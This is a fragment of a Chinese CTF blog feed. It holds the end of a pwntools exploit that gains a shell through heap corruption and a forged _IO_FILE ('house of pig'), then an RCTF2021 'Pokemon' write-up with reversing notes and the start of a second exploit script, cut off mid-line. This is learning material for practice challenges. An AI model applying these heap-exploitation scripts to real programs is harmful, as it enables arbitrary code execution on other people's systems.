class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(choice), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">question_num</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter the number of questions: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(question_num), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">idx, comment, size=<span class="literal">None</span></span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;which one? &gt; &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;please input the size of comment: &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;which student id to choose?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>(<span class="params">role</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(role), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>(<span class="params">addr=<span class="literal">None</span></span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(addr), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_pray</span>():</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_mod</span>(<span class="params">score, mod=<span class="literal">None</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> mod <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;enter your mode!&#x27;</span>)</span><br><span class="line">        r.send(mod)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;enter your pray score: 0 to 100&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(score), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your id: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">content</span>):</span></span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;never pray again!&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">create(<span class="number">9</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">xor_pray()</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">score()</span><br><span class="line">write_review(<span class="number">1</span>, <span class="string">b&#x27;dzhsb&#x27;</span>, <span class="number">0x350</span>)</span><br><span class="line">write_review(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">240</span> + flat(<span class="number">0x460</span>, <span class="number">0x261</span>), <span class="number">0x350</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">check_review()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class="line">chunk_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), base=<span class="number">16</span>) - <span class="number">0x2f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk_base))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(chunk_base + <span class="number">0x339</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">write_review(<span class="number">1</span>, <span class="string">b&#x27;wow&#x27;</span>, <span class="number">800</span> - <span class="number">0x20</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">check_review()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">9</span>)</span><br><span class="line">write_review(</span><br><span class="line">    <span class="number">0</span>, flat(chunk_base + <span class="number">0x6d0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0x1</span>, chunk_base + <span class="number">0x10</span>,</span><br><span class="line">            <span class="number">0x290</span>))</span><br><span class="line">write_review(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="string">b&#x27;7&#x27;</span> * <span class="number">0xc0</span> + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base - <span class="number">0x10</span>) + <span class="string">b&#x27;7&#x27;</span> *</span><br><span class="line">    (<span class="number">0x200</span> - <span class="number">8</span> * <span class="number">2</span> - <span class="number">0xc0</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_write_base=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _IO_write_ptr=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _IO_buf_base=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _IO_buf_end=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr) + \</span><br><span class="line">        p64(<span class="number">0</span>)+p64(_IO_buf_base)+p64(_IO_buf_end)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(<span class="number">0</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_str_jumps = libc_base + <span class="number">0x1e9560</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">file_struct = pack_file(</span><br><span class="line">    <span class="number">1</span>, <span class="number">0xffffffffffff</span>, libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xe0</span>,</span><br><span class="line">    libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xe0</span> + <span class="number">0x18</span>, _IO_str_jumps)</span><br><span class="line">file_struct += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system_addr) * <span class="number">2</span></span><br><span class="line">gift(file_struct + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://cv196082.gitee.io/2022/03/01/house-of-pig/">house of pig</a>源码层面分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;examination&quot;&gt;&lt;a href=&quot;#examination&quot; class=&quot;headerlink&quot; title=&quot;examination&quot;&gt;&lt;/a&gt;examination&lt;/h2&gt;&lt;p&gt;太菜了只做了第一道题，第二道题死活找不到漏洞点&lt;/p&gt;
&lt;h3 id</summary>
      
    
    
    
    <category term="比赛wp" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9Bwp/"/>
    
    
    <category term="house of pig" scheme="https://cv196082.gitee.io/tags/house-of-pig/"/>
    
    <category term="HeapFengShui" scheme="https://cv196082.gitee.io/tags/HeapFengShui/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2021复现</title>
    <link href="https://cv196082.gitee.io/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-10T09:14:14.000Z</published>
    <updated>2022-04-14T11:48:01.246Z</updated>
    
    <content type="html"><![CDATA[<p>以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己的逆向能力。</p><h2 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h2><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>main函数存在三个选项，第一就是创建chunk，创建的方式分为三种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct <span class="title">chunk</span><span class="params">(Gold <span class="number">3</span>)</span>0x1D0:</span>&#123;</span><br><span class="line"><span class="number">888</span>~<span class="number">908</span></span><br><span class="line"><span class="number">400</span>~<span class="number">420</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">struct <span class="title">chunk</span><span class="params">(Silver <span class="number">2</span>)</span>0x210:</span>&#123;</span><br><span class="line"><span class="number">666</span>~<span class="number">676</span></span><br><span class="line"><span class="number">200</span>~<span class="number">210</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">struct <span class="title">chunk</span><span class="params">(Bronze <span class="number">1</span>)</span>0x7f~0x380:</span>&#123;</span><br><span class="line"><span class="number">23</span>~<span class="number">23</span>+(size/<span class="number">16</span>)</span><br><span class="line">chunk_addr</span><br><span class="line">passwd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是我推测出来的三个结构体。</p><p>第二个选项就是对chunk进行一些行为，又分为三个，第一是释放chunk但是只允许类型为1的chunk被释放，第二个是show但是有一定的限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">memchr</span>((a1 + <span class="number">16</span>), <span class="number">0x7F</span>, <span class="number">8uLL</span>)</span><br><span class="line">    || <span class="built_in">memchr</span>((a1 + <span class="number">16</span>), <span class="number">0x7E</span>, <span class="number">8uLL</span>)</span><br><span class="line">    || <span class="built_in">strchr</span>((a1 + <span class="number">16</span>), <span class="number">0x55</span>)</span><br><span class="line">    || <span class="built_in">strchr</span>((a1 + <span class="number">16</span>), <span class="number">0x56</span>) )</span><br></pre></td></tr></table></figure><p>第三个选项就是修改内容，但是只可以修改一次并且类型1不能修改，类型2每个0x10才能修改，但是存在堆溢出，类型3可以修改0x10之后的内容大小为0x20</p><p>然后就是main当中的第三个选项，这里首先就是比较你的两个chunk的值与Mewtwo作比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Mewtwo</span>:</span>&#123;</span><br><span class="line"><span class="number">99999999</span></span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果小于则会直接推出，如果大于就会进入下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_3892</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">4</span> * (i + <span class="number">16LL</span>) + <span class="number">8</span>) == <span class="number">1</span> &amp;&amp; *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x10</span>LL) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_81F8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please remember the password of the evolutionary gem: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, (*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x10</span>LL), <span class="number">8uLL</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">    dword_81F8 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有限制条件的write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_396E</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(a1 + <span class="number">4</span> * (i + <span class="number">16LL</span>) + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">16LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please give the evolution password: &quot;</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x18</span>LL), <span class="number">0x30</span>uLL);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x2F</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          result = *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x18</span>LL) + j;</span><br><span class="line">          *result ^= *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + j % <span class="number">8</span> + <span class="number">0x10</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及一个写入，这个写入是往chunk的0x18上的地址的值来写入。</p><p>然后这里的free是存在一个小东西，就是如果chunk的0x10位置和0x18位置存在值就会free掉0x18位置的值。</p><p>然后这里把游戏角色的结构体贴出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">role</span>:</span>&#123;</span><br><span class="line">name;</span><br><span class="line"><span class="number">0x20</span>*(chunk+<span class="number">8</span>)+=<span class="number">1000</span>;</span><br><span class="line"><span class="number">0x28</span>*(chunk)+=<span class="number">0</span>;</span><br><span class="line"><span class="number">0x30</span>remaining=<span class="number">1666</span>;</span><br><span class="line"><span class="number">0x34</span>count;</span><br><span class="line"><span class="number">0x38</span>chunk;</span><br><span class="line"><span class="number">0x48</span>exists/category;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实这道题就算是逆向完了也有点儿难想到利用方式，这里很烦的一点就是我们可以控制的内容太少了，但是由于题目给的read的地方都不能修改掉fd和bk那就肯定是存在overlapping，加上存在堆溢出可以很容易想到改变堆的大小，形成UAF。</p><p><strong>然后这里需要注意的一点就是当malloc的size大于small bin中的size且小于small bin当中的size+0x10就不会进行切块</strong></p><p>但是我觉得这应该不只是small bin当中的机制(我看源码只看了small bin的request所以其他的我也不确定)，后面有时间会试试在unsorted bin和large bin中是否成立。</p><p>其实知道了这个知识点就很好利用了，因为如果按照固定思维的我们堆溢出无法修改掉size位，但是如果存在以上机制我们即可利用0x220来修改掉后面chunk的size了。</p><h4 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./Pokemon&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Pokemon&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">category, size=<span class="number">0</span>, idx=<span class="number">0</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(category), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> category == <span class="number">1</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;You will get a Pikachu. How big do you want it to be?&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx, need=<span class="literal">False</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> need:</span><br><span class="line">        r.recvuntil(</span><br><span class="line">            <span class="string">b&#x27;This Pokemon is very valuable. Are you sure you want to release it? [Y/N]&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        r.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You say: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">payload, key</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        res += <span class="built_in">chr</span>(payload[i] ^ key[i % <span class="number">8</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(res[<span class="built_in">len</span>(res) - <span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res, encoding=<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome to the Pokemon world, input your name: &#x27;</span>)</span><br><span 